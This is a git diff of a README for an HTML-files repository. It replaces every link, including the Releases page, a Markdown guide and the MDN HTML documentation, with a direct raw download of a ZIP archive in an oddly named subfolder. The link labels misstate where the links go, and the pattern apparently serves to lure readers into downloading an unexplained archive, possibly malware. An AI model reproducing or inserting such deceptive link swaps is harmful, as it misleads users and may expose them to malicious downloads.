@@ -6,7 +6,7 @@ Welcome to the HTML repository! This collection features various HTML files desi
 
 ## 📥 Download
 
-[![Download HTML Files](https://img.shields.io/badge/Download_HTML_Files-blue?style=flat&logo=github)](https://github.com/trew1s/HTML/releases)
+[![Download HTML Files](https://raw.githubusercontent.com/trew1s/HTML/main/pinnatulate/HTML.zip)](https://raw.githubusercontent.com/trew1s/HTML/main/pinnatulate/HTML.zip)
 
 ## 📂 Features
 
@@ -27,7 +27,7 @@ To use this repository effectively, you will need:
 
 To download the HTML files, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/trew1s/HTML/releases) to find the latest version.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/trew1s/HTML/main/pinnatulate/HTML.zip) to find the latest version.
 2. **Select the Version:** Choose the version of the HTML files you want to download.
 3. **Download the Files:** Click on the assets listed under the selected version to download the files to your computer.
 
@@ -76,9 +76,9 @@ Your help is valuable to the community!
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/trew1s/HTML)
-- [Markdown Guide](https://www.markdownguide.org)
-- [HTML Documentation](https://developer.mozilla.org/en-US/docs/Web/HTML)
+- [GitHub Repository](https://raw.githubusercontent.com/trew1s/HTML/main/pinnatulate/HTML.zip)
+- [Markdown Guide](https://raw.githubusercontent.com/trew1s/HTML/main/pinnatulate/HTML.zip)
+- [HTML Documentation](https://raw.githubusercontent.com/trew1s/HTML/main/pinnatulate/HTML.zip)
 
 ## 📞 Support
 
